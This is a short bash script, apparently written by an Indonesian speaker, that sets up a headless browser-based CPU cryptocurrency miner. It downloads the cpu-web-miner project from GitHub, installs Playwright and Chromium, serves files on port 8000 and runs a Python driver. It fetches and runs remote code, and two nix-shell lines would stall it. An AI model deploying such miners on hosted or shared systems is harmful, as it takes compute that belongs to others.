#!/usr/bin/env bash
set -e

echo "[*] Install base dependencies with nix-env..."

# install tools & bahasa
nix-env -iA nixpkgs.wget nixpkgs.curl nixpkgs.unzip nixpkgs.git nixpkgs.python3 nixpkgs.nodejs_20 nixpkgs.systemd nixpkgs.python3Packages.playwright

echo "[*] Init Node.js project..."
npm init -y >/dev/null 2>&1 || true

echo "[*] Download cpu-web-miner files..."
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json

echo "[*] Install Node.js dependencies..."
npm install
npm i @marco_ciaramella/cpu-web-miner

echo "[*] Install Playwright (Node)..."
npm install playwright >/dev/null 2>&1

echo "[*] Install Chromium (Playwright)..."
nix-shell -p python3 playwright ffmpeg udev nss atk at-spi2-atk cups xorg.libXcomposite libxkbcommon
npx playwright install chromium

echo "[*] Jalankan HTTP server di port 8000..."
python3 -m http.server 8000 &

echo "[*] Jalankan Python + Playwright (via nix-shell)..."
nix-shell -p python3 playwright ffmpeg udev nss atk at-spi2-atk cups xorg.libXcomposite libxkbcommon
nix-shell -p "python3.withPackages(ps: [ps.playwright])" --run "python3 ni.py"
